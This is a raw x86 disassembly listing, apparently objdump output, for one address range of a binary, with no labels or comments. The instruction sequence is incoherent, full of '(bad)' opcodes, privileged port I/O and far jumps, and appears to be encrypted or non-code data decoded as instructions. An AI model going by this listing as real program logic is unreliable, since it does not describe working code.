  4077e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077ea:	cwde   
  4077eb:	jp     0x4077cb
  4077ed:	mov    eax,0xb2d82c85
  4077f2:	cmp    ch,BYTE PTR [eax+0x6]
  4077f5:	out    0xa8,eax
  4077f7:	imul   ebx,DWORD PTR [ebp+0x78d238a3],0x30
  4077fe:	cmp    esi,DWORD PTR [ebx+esi*4]
  407801:	cwde   
  407802:	xchg   ebx,eax
  407803:	in     al,dx
  407804:	xchg   edx,eax
  407805:	adc    al,0x48
  407807:	enter  0xd605,0xb2
  40780b:	sti    
  40780c:	push   DWORD PTR [eax]
  40780e:	ds adc bl,dh
  407811:	sahf   
  407812:	outs   dx,BYTE PTR ds:[esi]
  407813:	inc    esp
  407814:	rcl    BYTE PTR [edx],0x21
  407817:	pop    esi
  407818:	retf   0x9953
  40781b:	adc    al,0x44
  40781d:	les    eax,FWORD PTR [edi+0xb]
  407820:	dec    ecx
  407821:	pushw  es
  407823:	inc    edi
  407824:	pop    ebx
  407825:	loopne 0x407891
  407827:	push   esp
  407828:	inc    eax
  407829:	cmp    bh,bl
  40782b:	cmp    al,0xe2
  40782d:	arpl   WORD PTR [ebp-0x2ac9e8e0],sp
  407833:	das    
  407834:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407835:	cmp    dl,BYTE PTR [ebp-0x2]
  407838:	add    BYTE PTR [ebx-0x77802771],dl
  40783e:	js     0x407852
  407840:	clc    
  407841:	inc    esp
  407842:	loop   0x40787d
  407844:	test   DWORD PTR [esi],eax
  407846:	fwait
  407847:	xchg   edi,eax
  407848:	sbb    BYTE PTR [edx-0x1e],al
  40784b:	cwde   
  40784c:	leave  
  40784d:	scas   eax,DWORD PTR es:[edi]
  40784e:	pop    ss
  40784f:	out    dx,al
  407850:	or     BYTE PTR [edi],dh
  407852:	(bad)  
  407854:	mov    ecx,0xa3fb8188
  407859:	adc    ecx,DWORD PTR [esi+0x1a]
  40785c:	add    DWORD PTR [edi],ecx
  40785e:	mov    ebx,0xe3bb2044
  407863:	jecxz  0x407862
  407865:	mov    dl,0x55
  407867:	sub    edi,DWORD PTR [ecx-0x7a]
  40786a:	mov    BYTE PTR [eax],ah
  40786c:	out    0x6b,al
  40786e:	das    
  40786f:	mul    edx
  407871:	call   0x70ae:0xf655bca6
  407878:	adc    al,0x1
  40787a:	cdq    
  40787b:	mov    cl,ah
  40787d:	add    al,0xf1
  40787f:	sbb    eax,DWORD PTR [ecx+eax*1-0x1e16bc66]
  407886:	rcl    BYTE PTR [edi+0x21],cl
  407889:	pop    ss
  40788a:	fist   WORD PTR [ebp+0x40]
  40788d:	cs (bad) 
  40788f:	cmp    BYTE PTR [ecx+esi*4-0x65dabbbd],al
  407896:	les    ebp,FWORD PTR [eax+eiz*1+0x4d]
  40789a:	icebp  
  40789b:	retf   
  40789c:	daa    
  40789d:	je     0x4078ba
  40789f:	jae    0x4078fd
  4078a1:	push   ebp
  4078a2:	fs clc 
  4078a4:	sub    eax,0x8b96bd35
  4078a9:	outs   dx,BYTE PTR ds:[esi]
  4078aa:	and    ah,BYTE PTR [edx+0x38]
  4078ad:	or     ebx,DWORD PTR [edx+0x78db22ee]
  4078b3:	add    eax,0x219ed163
  4078b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078b9:	or     BYTE PTR [eax-0x2863a83],ah
  4078bf:	not    DWORD PTR [edx+0x74]
  4078c2:	daa    
  4078c3:	loope  0x40789f
  4078c5:	jb     0x407920
  4078c7:	push   ebx
  4078c8:	sbb    eax,0x74a88612
  4078cd:	mov    edx,DWORD PTR [edx]
  4078cf:	(bad)  
  4078d0:	lock mov WORD PTR [ebp+eax*2-0x28ba841d],ss
  4078d8:	cwde   
  4078d9:	and    dh,al
  4078db:	rol    DWORD PTR [edi+0x50013ebe],0x8
  4078e2:	mov    dh,ah
  4078e4:	sbb    edx,eax
  4078e6:	push   ebp
  4078e7:	out    0x3,al
  4078e9:	mov    dl,0xe9
  4078eb:	out    0xa5,eax
  4078ed:	std    
  4078ee:	jns    0x407931
  4078f0:	xor    al,BYTE PTR [edx+esi*8]
  4078f3:	mov    esp,0x84e0b8e0
  4078f8:	pop    ss
  4078f9:	call   0x272bf466
  4078fe:	and    DWORD PTR [ebx-0x1],ecx
  407901:	sahf   
  407902:	pusha  
  407903:	lods   al,BYTE PTR ds:[esi]
  407904:	add    BYTE PTR [ebp+0x5c],ah
  407907:	stos   DWORD PTR es:[edi],eax
  407908:	jp     0x407934
  40790a:	dec    edx
  40790b:	or     al,bh
  40790d:	rol    edi,cl
  40790f:	push   ebp
  407910:	mov    eax,ds:0xf487bc55
  407915:	pop    esi
  407916:	jns    0x407904
  407918:	shr    DWORD PTR [edx-0x48],1
  40791b:	into   
  40791c:	mov    cl,0xe
  40791e:	inc    BYTE PTR [edx]
  407920:	push   0x4341bbdf
  407925:	or     DWORD PTR [esi-0x42617dd4],0xcd171788
  40792f:	add    al,0xcc
  407931:	xchg   DWORD PTR [edx+0x24],edi
  407934:	cdq    
  407935:	outs   dx,BYTE PTR ds:[esi]
  407936:	mov    ds:0xb2e468a0,eax
  40793b:	daa    
  40793c:	jno    0x40797d
  40793e:	mov    ebx,0xc3141222
  407943:	shr    BYTE PTR [ebp+0xf],0x84
  407947:	popf   
  407948:	icebp  
  407949:	rcl    BYTE PTR [esi+0x76af7bc6],cl
  40794f:	xor    eax,0x82752948
  407954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407955:	retf   
  407956:	aad    0x5b
  407958:	dec    edx
  407959:	jle    0x40798d
  40795b:	(bad)  
  40795c:	jo     0x4078e8
  40795e:	mov    BYTE PTR [ecx-0x2a3dc1c5],bh
  407964:	outs   dx,DWORD PTR ds:[esi]
  407965:	jl     0x4078ef
  407967:	sub    DWORD PTR [edx],eax
  407969:	pop    ebx
  40796a:	retf   0x327e
  40796d:	jmp    0xf84ee2a9
  407972:	mov    ecx,0x9546e144
  407977:	aaa    
  407978:	scas   eax,DWORD PTR es:[edi]
  407979:	cmc    
  40797a:	loopne 0x4079cf
  40797c:	xor    dl,BYTE PTR [eax-0x6a8edf20]
  407982:	mov    bh,0xd3
  407984:	stos   DWORD PTR es:[edi],eax
  407985:	int    0xc5
  407987:	sub    bl,BYTE PTR [edi-0x7b]
  40798a:	inc    edi
  40798b:	popa   
  40798c:	fwait
  40798d:	cs je  0x407931
  407990:	aas    
  407991:	les    ebx,FWORD PTR [ecx]
  407993:	clc    
  407994:	in     eax,dx
  407995:	sbb    al,0xf1
  407997:	dec    ecx
  407998:	jge    0x4079be
  40799a:	(bad)  
  40799b:	push   ecx
  40799c:	adc    edx,DWORD PTR [edx]
  40799e:	pop    ds
  40799f:	mov    ds:0x3abcf7,al
  4079a4:	outs   dx,BYTE PTR ds:[esi]
  4079a5:	xchg   edi,eax
  4079a6:	cmp    ecx,ecx
  4079a8:	repnz push cs
  4079aa:	and    cl,BYTE PTR [eax-0x7c]
  4079ad:	dec    esi
  4079ae:	push   0x1f28c412
  4079b3:	pop    eax
  4079b4:	xor    BYTE PTR [esi+ebx*2+0x2780e8a9],bh
  4079bb:	cdq    
  4079bc:	jae    0x407963
  4079be:	pop    ds
  4079bf:	dec    ebp
  4079c0:	sub    BYTE PTR [edx+0x200b547f],0xa8
  4079c7:	daa    
  4079c8:	nop
  4079c9:	imul   eax,DWORD PTR [edx+0x32cf2434],0xffffffdb
  4079d0:	fcmovnbe st,st(1)
  4079d2:	stos   DWORD PTR es:[edi],eax
  4079d3:	das    
  4079d4:	arpl   WORD PTR [esi+0x28daf617],dx
  4079da:	stc    
  4079db:	frstor [ebp-0x7e104a70]
  4079e1:	mov    ebp,0xb34b2807
  4079e6:	push   ss
  4079e7:	inc    ecx
  4079e8:	jle    0x4079a3
  4079ea:	mov    edx,0xf444d1f3
  4079ef:	mov    BYTE PTR ds:0x48345e78,ch
  4079f5:	xchg   esi,eax
  4079f6:	into   
  4079f7:	and    al,0x5c
  4079f9:	cmp    BYTE PTR [edi+0x7f],bl
  4079fc:	jmp    0xd24826b9
  407a01:	fcmove st,st(4)
  407a03:	clc    
  407a04:	inc    ebx
  407a05:	pop    esp
  407a06:	or     esi,DWORD PTR [ebx+0x52]
  407a09:	push   es
  407a0a:	mov    BYTE PTR [esi+0x1a89a7cf],bl
  407a10:	pop    ds
  407a11:	push   esi
  407a12:	pop    eax
  407a13:	mul    BYTE PTR [eax-0x3d]
  407a16:	adc    al,0x1a
  407a18:	shl    edi,1
  407a1a:	hlt    
  407a1b:	and    eax,0xcf8905a4
  407a20:	inc    edi
  407a21:	scas   al,BYTE PTR es:[edi]
  407a22:	lods   eax,DWORD PTR ds:[esi]
  407a23:	f2xm1  
  407a25:	je     0x407a5e
  407a27:	jne    0x407a6b
  407a29:	jecxz  0x407a03
  407a2b:	push   ebp
  407a2c:	xchg   BYTE PTR [ebx],al
  407a2e:	lods   al,BYTE PTR ds:[esi]
  407a2f:	lds    ebp,FWORD PTR [edi+eax*4+0x3243b1f0]
  407a36:	xor    BYTE PTR [ecx+0x3e],al
  407a39:	mov    bh,0xb3
  407a3b:	jg     0x407a8a
  407a3d:	xor    eax,0x23266b4c
  407a42:	iret   
  407a43:	sub    al,0x6d
  407a45:	ret    
  407a46:	in     al,dx
  407a47:	call   0xf2d249a8
  407a4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a4d:	(bad)  
  407a4e:	dec    esp
  407a4f:	popf   
  407a50:	push   ds
  407a51:	and    edi,ecx
  407a53:	repz sahf 
  407a55:	sbb    al,0x61
  407a57:	mov    ebp,0x101f9be5
  407a5c:	sub    DWORD PTR [esi-0x71],ecx
  407a5f:	push   ebp
  407a60:	ficomp DWORD PTR [esi+0x758d72d0]
  407a66:	jnp    0x407a51
  407a68:	sub    bh,BYTE PTR [ebx-0x37]
  407a6b:	fucomi st,st(4)
  407a6d:	sbb    DWORD PTR [edi+eax*4],eax
  407a70:	and    edi,esp
  407a72:	xor    ebp,esp
  407a74:	push   ss
  407a75:	push   ss
  407a76:	jnp    0x407ae6
  407a78:	jge    0x407a64
  407a7a:	jae    0x4079fc
  407a7c:	lock pop ebx
  407a7e:	stos   DWORD PTR es:[edi],eax
  407a7f:	cmp    ebx,DWORD PTR [eax+ebp*8+0x6f]
  407a83:	aas    
  407a84:	inc    edi
  407a85:	jb     0x407ac1
  407a87:	and    al,0x22
  407a89:	das    
  407a8a:	adc    ebx,DWORD PTR [esi+0x12200210]
  407a90:	shl    BYTE PTR [ebp-0x389e01ca],1
  407a96:	sub    eax,edx
  407a98:	xor    DWORD PTR [ebx],esi
  407a9a:	xlat   BYTE PTR ds:[ebx]
  407a9b:	shr    DWORD PTR [edx+eax*1],0x15
  407a9f:	adc    DWORD PTR [ecx-0x4690c65d],ebx
  407aa5:	pusha  
  407aa6:	and    bh,BYTE PTR [edi+0x77d9d374]
  407aac:	push   eax
  407aad:	mov    dh,0xa9
  407aaf:	pusha  
  407ab0:	xchg   esi,eax
  407ab1:	loopne 0x407aea
  407ab3:	adc    DWORD PTR [ebp-0x59814360],ecx
  407ab9:	mov    dh,BYTE PTR [ecx]
  407abb:	xlat   BYTE PTR fs:[ebx]
  407abd:	lods   eax,DWORD PTR ds:[esi]
  407abe:	pusha  
  407abf:	(bad)  
  407ac0:	jae    0x407a5b
  407ac2:	sar    dh,0xa5
  407ac5:	add    al,0x21
  407ac7:	add    al,0x76
  407ac9:	jmp    0xe43e:0x8e3b0aae
  407ad0:	jg     0x407ad7
  407ad2:	add    esp,DWORD PTR [ecx-0x73]
  407ad5:	mov    al,0x2d
  407ad7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ad8:	adc    eax,0xfce0c066
  407add:	jg     0x407a70
  407adf:	jge    0x407afb
  407ae1:	ja     0x407ad1
  407ae3:	xchg   ebx,eax
  407ae4:	enter  0xd9fa,0x77
  407ae8:	jg     0x407b27
  407aea:	hlt    
  407aeb:	test   esi,0xe06e3d3f
  407af1:	sub    BYTE PTR [ebp-0xfbcdf5f],0x20
  407af8:	mov    dl,0x28
  407afa:	xchg   ebx,eax
  407afb:	mov    ebx,0x72a37824
  407b00:	mov    al,BYTE PTR [ecx-0x504f4263]
  407b06:	sub    DWORD PTR [ebx+edx*4-0x31],ebx
  407b0a:	jbe    0x407afc
  407b0c:	xor    BYTE PTR [ebx+0xe],0x7b
  407b10:	dec    edx
  407b11:	pop    ebx
  407b12:	jae    0x407b4c
  407b14:	push   0x14
  407b16:	sub    DWORD PTR [edx-0x48],eax
  407b19:	adc    BYTE PTR [ecx+0xdfa0bab],bh
  407b1f:	mov    esi,0x6c7c4283
  407b24:	les    edx,FWORD PTR [ecx-0x4b]
  407b27:	imul   ebx,DWORD PTR [ebp-0x56],0x24b7790c
  407b2e:	imul   eax
  407b30:	inc    edi
  407b31:	aam    0xe8
  407b33:	xchg   DWORD PTR [eax+ebp*4],esp
  407b36:	or     edx,ebp
  407b38:	jno    0x407ac0
  407b3a:	push   eax
  407b3b:	retf   
  407b3c:	push   ss
  407b3d:	inc    ebx
  407b3e:	xlat   BYTE PTR ds:[ebx]
  407b3f:	fs jecxz 0x407b10
  407b42:	jns    0x407baa
  407b44:	test   BYTE PTR [ebx],dh
  407b46:	std    
  407b47:	xor    BYTE PTR [ecx+esi*8-0x2b],al
  407b4b:	dec    edx
  407b4c:	div    BYTE PTR [ecx+0x56dc3756]
  407b52:	aad    0x40
  407b54:	popf   
  407b55:	neg    edx
  407b57:	call   0x429ec42a
  407b5c:	mov    ch,0x99
  407b5e:	pusha  
  407b5f:	sub    DWORD PTR [eax],eax
  407b61:	add    eax,0xcea7f20f
  407b66:	std    
  407b67:	jb     0x407b55
  407b69:	push   ebx
  407b6a:	hlt    
  407b6b:	xchg   esp,eax
  407b6c:	(bad)  
  407b6d:	mul    DWORD PTR [eax-0x1b]
  407b70:	xchg   esi,eax
  407b71:	sub    cl,BYTE PTR [edi]
  407b73:	mov    edx,0x7aefafd0
  407b78:	xor    esi,DWORD PTR [ebx-0x7]
  407b7b:	imul   BYTE PTR [edx]
  407b7d:	adc    al,0x61
  407b7f:	cmp    BYTE PTR [ebx-0x5d328260],ah
  407b85:	scas   al,BYTE PTR es:[edi]
  407b86:	jle    0x407bed
  407b88:	(bad)  
  407b89:	and    al,0x64
  407b8b:	jg     0x407bca
  407b8d:	(bad)  
  407b8e:	std    
  407b8f:	(bad)  
  407b90:	ror    cl,cl
  407b92:	pop    eax
  407b93:	rcr    BYTE PTR [ecx+0x2db9f9aa],cl
  407b99:	adc    BYTE PTR [ebx],dh
  407b9b:	add    al,0x67
  407b9d:	lea    eax,[ebx-0x4a]
  407ba0:	popa   
  407ba1:	xchg   edi,eax
  407ba2:	loop   0x407beb
  407ba4:	xor    al,0x22
  407ba6:	push   cs
  407ba7:	popa   
  407ba8:	sub    DWORD PTR [ecx+0x12],0xf76fdb1a
  407baf:	sbb    ebp,DWORD PTR [ebx-0x12]
  407bb2:	and    eax,0x8a74e7d2
  407bb7:	mov    dl,0xbf
  407bb9:	in     eax,0xcd
  407bbb:	cli    
  407bbc:	inc    edi
  407bbd:	mov    ecx,0xd4c5546a
  407bc2:	scas   eax,DWORD PTR es:[edi]
  407bc3:	pop    ecx
  407bc4:	iret   
  407bc5:	add    bl,dh
  407bc7:	jno    0x407b92
  407bc9:	lea    ebp,[edx-0x421449e6]
  407bcf:	clc    
  407bd0:	pop    edx
  407bd1:	inc    ebp
  407bd2:	push   edi
  407bd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bd4:	lds    esp,FWORD PTR [edi-0x61]
  407bd7:	cld    
  407bd8:	pop    edi
  407bd9:	xor    bh,BYTE PTR [ebx-0x51]
  407bdc:	adc    dl,BYTE PTR [ebp+ebp*1-0x37f2c351]
  407be3:	shr    DWORD PTR [esi+0x48],1
  407be6:	add    bl,BYTE PTR [ebx]
  407be8:	es fs enter 0x5ebd,0xe1
  407bee:	mov    al,ds:0x2a09ad53
  407bf3:	inc    ecx
  407bf4:	loopne 0x407c59
  407bf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bf7:	dec    esp
  407bf8:	and    BYTE PTR [ecx-0x4c9fc5e6],0x92
  407bff:	push   edx
  407c00:	fldcw  WORD PTR [ebx+0x28]
  407c03:	or     al,0xb2
  407c05:	loop   0x407c77
  407c07:	cmp    al,0xaa
  407c09:	and    DWORD PTR [edx+0x46],ecx
  407c0c:	jbe    0x407ba1
  407c0e:	dec    edi
  407c0f:	jo     0x407be2
  407c11:	(bad)  
  407c12:	adc    DWORD PTR [edi+0x218f6cb6],0xffffffa6
  407c19:	mov    dl,BYTE PTR [edi+0x1980c72e]
  407c1f:	bound  ecx,QWORD PTR [ebx+eiz*8+0x56]
  407c23:	sbb    al,0x17
  407c25:	sbb    eax,0xbb90abf9
  407c2a:	adc    DWORD PTR [edx+esi*8],0xffffffe9
  407c2e:	mov    ch,0x5c
  407c30:	pop    edi
  407c31:	push   ecx
  407c32:	xchg   ebx,ecx
  407c34:	push   eax
  407c35:	adc    al,0xae
  407c37:	ret    0x156d
  407c3a:	mov    dh,0xa3
  407c3c:	push   cs
  407c3d:	mov    edx,0xac2d66e4
  407c43:	scas   eax,DWORD PTR es:[edi]
  407c44:	in     eax,dx
  407c45:	inc    ebx
  407c46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c48:	ret    0x669d
  407c4b:	mov    eax,ds:0x2e41e41
  407c50:	inc    ebx
  407c51:	jns    0x407cc6
  407c53:	cmp    ecx,eax
  407c55:	mov    ebx,0x966ecaa0
  407c5a:	pushf  
  407c5b:	jae    0x407cc6
  407c5d:	pop    ss
  407c5e:	inc    edx
  407c5f:	or     al,0xcf
  407c61:	and    bl,dl
  407c63:	fistp  QWORD PTR [eax]
  407c65:	mov    ecx,DWORD PTR [edx+0x1c6f10d3]
  407c6b:	inc    edi
  407c6c:	xor    dl,BYTE PTR [esi+0x2]
  407c6f:	nop
  407c70:	and    BYTE PTR [esi+0x44],ch
  407c73:	mov    cl,0x36
  407c75:	fiadd  DWORD PTR [eax-0x3e472963]
  407c7b:	sbb    edi,esi
  407c7d:	out    dx,al
  407c7e:	fnsave [eax-0x48c47668]
  407c84:	push   esi
  407c85:	dec    ecx
  407c86:	add    ch,BYTE PTR [edi-0x3d]
  407c89:	inc    ecx
  407c8a:	cwde   
  407c8b:	sbb    al,0xa8
  407c8d:	mov    eax,0x65c9ff69
  407c92:	push   0x6b
  407c94:	fdiv   st(5),st
  407c96:	pop    es
  407c97:	into   
  407c98:	stos   DWORD PTR es:[edi],eax
  407c99:	add    al,cl
  407c9b:	rol    BYTE PTR [ebx+0x5352b602],0xd
  407ca2:	aas    
  407ca3:	mov    bl,0x6
  407ca5:	int    0x63
  407ca7:	sub    esi,DWORD PTR [edx]
  407ca9:	sbb    esi,DWORD PTR [eax+esi*1]
  407cac:	sbb    BYTE PTR [ebx-0x10],0xb0
  407cb0:	jge    0x407d05
  407cb2:	in     eax,dx
  407cb3:	ror    DWORD PTR [ebx-0x29aab18a],0xdf
  407cba:	ins    DWORD PTR es:[edi],dx
  407cbb:	retf   0x8a6b
  407cbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cbf:	inc    eax
  407cc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cc1:	adc    al,0x4a
  407cc3:	leave  
  407cc4:	sbb    edx,DWORD PTR [eax]
  407cc6:	mov    dh,0x11
  407cc8:	sub    bh,ch
  407cca:	jmp    0xd021:0x3ec1c46e
  407cd1:	retf   0x39e9
  407cd4:	in     eax,0xe0
  407cd6:	cwde   
  407cd7:	mov    esi,0x159cf809
  407cdc:	add    ebp,DWORD PTR [esi+0x6e]
  407cdf:	leave  
  407ce0:	mov    DWORD PTR [ebx+0x2d],edx
  407ce3:	xchg   ecx,eax
  407ce4:	add    al,0x97
  407ce6:	push   ecx
  407ce7:	push   cs
  407ce8:	(bad)  
  407cea:	mov    edx,0x66723939
  407cef:	dec    ebp
  407cf0:	pop    edi
  407cf1:	cld    
  407cf2:	cld    
  407cf3:	loop   0x407cf6
  407cf5:	mov    esp,eax
  407cf7:	add    al,0x55
  407cf9:	xchg   ebx,eax
  407cfa:	fistp  QWORD PTR [edi-0x5e40bf09]
  407d00:	fs out dx,al
  407d02:	mov    ebx,0xc2fc45cc
  407d07:	and    eax,DWORD PTR [esi]
  407d09:	test   BYTE PTR [edx+0x7],0xe1
  407d0d:	ret    
  407d0e:	adc    eax,0x7ad8d019
  407d13:	xlat   BYTE PTR ds:[ebx]
  407d14:	mov    bh,0x62
  407d16:	mov    esp,0x46c650f8
  407d1b:	repnz shl DWORD PTR [edi],0xb3
  407d1f:	ficomp WORD PTR [edx-0x6c620295]
  407d25:	cdq    
  407d26:	jbe    0x407cd1
  407d28:	dec    esp
  407d29:	je     0x407d37
  407d2b:	aaa    
  407d2c:	out    0x12,al
  407d2e:	fadd   DWORD PTR [edi+edi*1+0x1e]
  407d32:	clc    
  407d33:	(bad)  
  407d34:	or     DWORD PTR [ebp+eax*1-0x6cf0f5f5],ebp
  407d3b:	das    
  407d3c:	(bad)  
  407d3d:	pop    ebp
  407d3e:	mov    ds:0xd70e4deb,eax
  407d43:	sahf   
  407d44:	inc    esi
  407d45:	or     eax,0x8425a389
  407d4a:	fs xchg ebp,eax
  407d4c:	js     0x407ced
  407d4e:	jbe    0x407d70
  407d50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d51:	std    
  407d52:	jno    0x407d11
  407d54:	ins    DWORD PTR es:[edi],dx
  407d55:	fnstsw WORD PTR [edi+0x7da89a4b]
  407d5b:	repnz mov BYTE PTR [ecx],dh
  407d5e:	jp     0x407d95
  407d60:	xchg   ebp,eax
  407d61:	sbb    eax,0xa0c67812
  407d66:	loope  0x407dbc
  407d68:	adc    DWORD PTR [edx-0x62906bd2],edx
  407d6e:	jo     0x407d16
  407d70:	sbb    eax,0xb10bf954
  407d75:	jo     0x407d77
  407d77:	retf   0xcf0e
  407d7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d7b:	adc    eax,0x6fed69f0
  407d80:	shl    BYTE PTR [ecx],0xf9
  407d83:	jl     0x407e02
  407d85:	inc    ecx
  407d86:	xchg   ebp,eax
  407d87:	push   ebp
  407d88:	iret   
  407d89:	push   eax
  407d8a:	(bad)  
  407d8b:	adc    ah,BYTE PTR [ecx-0x16]
  407d8e:	mov    ch,BYTE PTR [eax-0x37023e0f]
  407d94:	add    al,al
  407d96:	mov    dl,0x51
  407d98:	adc    bh,cl
  407d9a:	and    dh,BYTE PTR [ebp-0x10]
  407d9d:	lea    eax,[ebp+0x61]
  407da0:	adc    ch,BYTE PTR [edi+0x19]
  407da3:	gs mov bl,0x76
  407da6:	sub    al,0x32
  407da8:	cld    
  407da9:	into   
  407daa:	inc    esp
  407dab:	loop   0x407d41
  407dad:	into   
  407dae:	mov    ebp,0x1f8f633d
  407db3:	pop    eax
  407db4:	ins    DWORD PTR es:[edi],dx
  407db5:	or     dh,bh
  407db7:	sub    ecx,edi
  407db9:	cmp    DWORD PTR [eax],0xffffffe9
  407dbc:	add    dl,BYTE PTR ds:0x341fb710
  407dc2:	das    
  407dc3:	dec    ecx
  407dc4:	mov    dl,0x99
  407dc6:	imul   ch
  407dc8:	sbb    bh,BYTE PTR [edi]
  407dca:	inc    ecx
  407dcb:	or     BYTE PTR [ecx],al
  407dcd:	fsubr  QWORD PTR [esi]
  407dcf:	in     eax,0x84
  407dd1:	and    esp,ebx
  407dd3:	rcl    DWORD PTR [esi-0xf],cl
  407dd6:	jns    0x407dc1
  407dd8:	push   eax
  407dd9:	pop    esp
  407dda:	jo     0x407d8c
  407ddc:	in     eax,0x74
  407dde:	iret   
  407ddf:	jae    0x407e1b
  407de1:	sbb    eax,0x3db738f7
  407de6:	cmp    eax,DWORD PTR [ebx]
  407de8:	ret    0x237c
  407deb:	in     al,dx
  407dec:	mov    esp,0x9a7dcfab
  407df1:	cdq    
  407df2:	mov    ds:0x76d3a75b,al
  407df7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407df8:	pop    ecx
  407df9:	or     eax,0x6db7fa87
  407dfe:	test   eax,0x72a2bf32
  407e03:	add    esi,DWORD PTR [edi]
  407e05:	fild   WORD PTR ds:0xd110b7
  407e0b:	cmp    DWORD PTR [eax-0x77],eax
  407e0e:	(bad)  [esi]
  407e10:	or     eax,0x1da7d36d
  407e15:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  407e17:	add    edx,DWORD PTR [eax]
  407e19:	sub    DWORD PTR [ebx],ebx
  407e1b:	aas    
  407e1c:	ins    BYTE PTR es:[edi],dx
  407e1d:	ins    BYTE PTR es:[edi],dx
  407e1e:	cmp    dh,bh
  407e20:	nop
  407e21:	bound  ebx,QWORD PTR [esi]
  407e23:	adc    cl,cl
  407e25:	jle    0x407e22
  407e27:	fmulp  st(0),st
  407e29:	imul   edi
  407e2b:	repz sub ebp,edi
  407e2e:	jb     0x407e60
  407e30:	scas   al,BYTE PTR es:[edi]
  407e31:	pop    ecx
  407e32:	sar    BYTE PTR [ecx-0x9049fd1],cl
  407e38:	imul   esi,DWORD PTR [edi-0x1cc9b88d],0x4d
  407e3f:	jno    0x407dd4
  407e41:	sub    ecx,0x67eb794b
  407e47:	mov    bl,0xa6
  407e49:	je     0x407ea9
  407e4b:	sbb    dl,BYTE PTR [ecx+0x1]
  407e4e:	cmc    
  407e4f:	aas    
  407e50:	mov    ebp,0xb5207890
  407e55:	inc    esi
  407e56:	mov    bl,0xff
  407e58:	out    dx,al
  407e59:	xchg   esi,eax
  407e5a:	cmp    al,0x3b
  407e5c:	les    ebp,FWORD PTR [ebx-0x46]
  407e5f:	pusha  
  407e60:	add    al,0x90
  407e62:	repz clc 
  407e64:	jmp    0x407e14
  407e66:	loope  0x407dee
  407e68:	xor    bl,bl
  407e6a:	loop   0x407ecb
  407e6c:	ins    BYTE PTR es:[edi],dx
  407e6d:	xor    BYTE PTR [ecx-0x37],dh
  407e70:	pusha  
  407e71:	icebp  
  407e72:	cmp    eax,0xcdacd3b0
  407e77:	xchg   esi,eax
  407e78:	xor    cl,ch
  407e7a:	out    0x88,eax
  407e7c:	dec    esp
  407e7d:	mov    dh,0x2d
  407e7f:	dec    esi
  407e80:	inc    esi
  407e81:	xchg   edi,eax
  407e82:	hlt    
  407e83:	cmp    cl,dh
  407e85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e87:	jle    0x407e8a
  407e89:	sbb    eax,0x9f5435b
  407e8e:	add    al,0xe0
  407e90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e91:	xchg   ebp,eax
  407e92:	test   DWORD PTR [esi+ecx*1],ebx
  407e95:	std    
  407e96:	jbe    0x407e45
  407e98:	push   es
  407e99:	and    DWORD PTR [ecx-0x28ff80a],edx
  407e9f:	mov    bl,0xc5
  407ea1:	out    dx,al
  407ea2:	push   esp
  407ea3:	sbb    al,0xb6
  407ea5:	mov    al,0x7a
  407ea7:	jl     0x407f26
  407ea9:	fcom   DWORD PTR [ecx+0x47fb907d]
  407eaf:	aas    
  407eb0:	pop    edx
  407eb1:	dec    ebp
  407eb2:	cwde   
  407eb3:	fcmovne st,st(7)
  407eb5:	push   eax
  407eb6:	test   eax,0xaffac5ee
  407ebb:	xor    al,0x0
  407ebd:	dec    esp
  407ebe:	fucomp st(4)
  407ec0:	jp     0x407e81
  407ec2:	and    BYTE PTR [edi+0x42f3ead6],cl
  407ec8:	inc    esp
  407ec9:	aad    0x90
  407ecb:	test   BYTE PTR [esi+0x1b135c9d],cl
  407ed1:	into   
  407ed2:	push   esp
  407ed3:	cwde   
  407ed4:	pop    edi
  407ed5:	add    ah,BYTE PTR [ecx]
  407ed7:	pushf  
  407ed8:	adc    al,0x95
  407eda:	pop    edi
  407edb:	stos   BYTE PTR es:[edi],al
  407edc:	inc    edx
  407edd:	call   0x520c:0x55c1eb83
  407ee4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ee5:	sbb    al,BYTE PTR [edi+edi*1-0x93c9d40]
  407eec:	or     eax,0x19840e3a
  407ef1:	repz pop esp
  407ef3:	std    
  407ef4:	sar    BYTE PTR [edx+0x2f],cl
  407ef7:	shl    BYTE PTR [eax-0x379c4f12],1
  407efd:	dec    ebx
  407efe:	xchg   esp,eax
  407eff:	enter  0xf417,0x8e
  407f03:	mov    cl,0xff
  407f05:	push   es
  407f06:	jns    0x407f3a
  407f08:	ror    ch,cl
  407f0a:	pop    eax
  407f0b:	jg     0x407e9a
  407f0d:	push   esi
  407f0e:	sbb    DWORD PTR [esi],esi
  407f10:	(bad)  [eax-0x36d0f981]
  407f16:	loope  0x407ea4
  407f18:	outs   dx,BYTE PTR ds:[esi]
  407f19:	shr    DWORD PTR [edi+0x6ad9775c],0xf
  407f20:	jecxz  0x407f98
  407f22:	mov    WORD PTR [ebx+0x68e02baa],es
  407f28:	cmp    DWORD PTR [esi+0x510cac97],esi
  407f2e:	cmp    edi,DWORD PTR [edi]
  407f30:	or     dh,0xa4
  407f33:	retf   0xee67
  407f36:	lds    ecx,FWORD PTR [ecx]
  407f38:	or     eax,DWORD PTR [edx+0xc3dced6]
  407f3e:	pop    eax
  407f3f:	lds    edi,FWORD PTR [eax]
  407f41:	xchg   edi,eax
  407f42:	test   eax,0x23d5bd2e
  407f48:	inc    esi
  407f49:	ja     0x407f93
  407f4b:	mov    ds:0xbaa64058,eax
  407f50:	cmc    
